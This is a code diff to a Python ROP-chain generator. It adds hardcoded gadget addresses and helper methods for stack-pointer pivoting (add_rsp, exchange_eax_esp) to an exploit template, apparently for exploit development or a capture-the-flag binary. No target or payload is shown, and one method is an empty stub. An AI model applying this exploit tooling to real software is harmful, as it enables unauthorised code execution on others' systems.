@@ -17,7 +17,7 @@ exit_addr       = 0x0000000000434180
 nop_gadet       = 0x0000000000408B87
 cmov_rax_rdx    = 0x000000000048D057
 xchg_eax_esp    = 0x000000000040037f
-add_eax_edi     = 0x000000000041C673
+add_eax_edi_g     = 0x000000000041C673
 mov_eax_esp     = 0x00000000004236DB
 xchg_eax_ebx    = 0x0000000000459339
 pop_rbx         = 0x000000000040B7CE
@@ -26,10 +26,16 @@ class metaGadetGenerator:
     def __init__(self, exp : exploiterTemplate) -> None:
         self.exp = exp
 
+    def get_num_of_opcodes(self):
+        return self.exp.numOfOps
+
     def ret2_exit(self, exit_code):
         self.rdi_equ(exit_code)
 
         self.exp.add_gadet(exit_addr)
+
+    def add_eax_edi(self):
+        self.exp.add_gadet(add_eax_edi_g)
 
     def ret2_read(self, fd, buf, count):
         self.rdi_equ(fd)
@@ -166,6 +172,8 @@ class metaGadetGenerator:
         # Add padding for add rsp
         self.exp.add_gadet(0x0000000000000000)
 
+    def exchange_eax_esp(self):
+        self.exp.add_gadet(xchg_eax_esp)
 
     def read_toRAX(self, ea):
         global derefer_rax_rax
@@ -185,7 +193,6 @@ class metaGadetGenerator:
 
 
     # 32 Bit
-    # Side effect: Zeros RBX
     # Params:
     #           EAX - jump offset
     def rsp_add_immediate_rax(self):
@@ -205,11 +212,34 @@ class metaGadetGenerator:
         # ebx holds 32 LSB of RSP
 
 
+    # 32 Bit
+    def add_rsp(self, offset):
+        # Set to RDI to jump offset
+        self.rdi_equ(offset)
+
+        # Save 32 first bits for computation
+        self.eax_equ_esp()
+        self.add_eax_edi()
+
+        # Exchange EAX with ESP after calculation
+        self.exchange_eax_esp()
 
 
+    # 32 Bit
+    # Params:
+    #           EAX - jump offset
+    def rsp_add_immediate_rdi(self):
+        # Save 32 first bits for computation
+        self.eax_equ_esp()
+        self.add_eax_edi()
 
+        # Exchange EAX with ESP after calculation
+        self.exchange_eax_esp()
+
+
+    # Jumps to offset if RAX == RBX
     def jump_if_equal(self, offset, cell_ea):
-        
+        pass
 
 
     def finalize(self):        
